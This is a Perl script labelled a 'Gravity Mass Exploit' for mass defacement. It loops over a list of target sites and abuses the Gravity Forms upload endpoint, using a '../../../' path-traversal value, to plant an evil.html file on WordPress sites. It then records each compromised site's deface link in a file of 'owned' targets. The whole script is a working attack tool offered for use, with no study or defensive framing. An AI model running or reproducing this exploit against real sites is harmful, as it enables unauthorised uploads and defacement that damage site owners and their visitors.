#!/usr/bin/perl -U

use Win32::Console::ANSI;
use Term::ANSIColor;
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

print "\n\n";
print"         --=[";
print colored(" GRAVITY MASS EXPLOIT - MASS DEFACE ",'on_blue');
print"]\n";
print"         --=[";
print colored(" UPDATE BY SMOOKE - V4P0R - TR4XB0Y ",'on_blue');
print"]\n";

my $usage = " \nperl $0 <list.txt>\n perl $0 list.txt";
die "$usage" unless $ARGV[0];

open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
my $path = "/?gf_page=upload"; sleep(1);

print "\n  [TARGET] => $target\n\n";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$target/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["unknown.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "evil.html"]);

print "  [";
print colored ("WORK",'bold on_blue'); sleep(1);
print "]","\n";

if ($exploit->decoded_content =~ /_input_3_evil.html/) {
print "  [";
print colored ("VULN",'bold on_yellow'),; sleep(1);
print "]";
print " UPLOAD DEFACE\n";	
print "  [";
print colored ("OK",'bold on_green'),; sleep(1);
print "]";
print " UPLOAD DEFACE SUCESS\n";
print "  [";
print colored ("DEFACE LINK",'bold on_green'),; sleep(1);
print "]";
print " $target/wp-content/uploads/_input_3_evil.html\n";	
	open(save, '>>Smooke-Owneds.txt');
	
    print save "$target/wp-content/uploads/_input_3_evil.html\n";
	
    close(save);
}

else { 
print "  [";
print colored ("ERROR",'bold on_red'),; sleep(1);
print "]";
print " NOT VULN\n";
sleep(1);}

}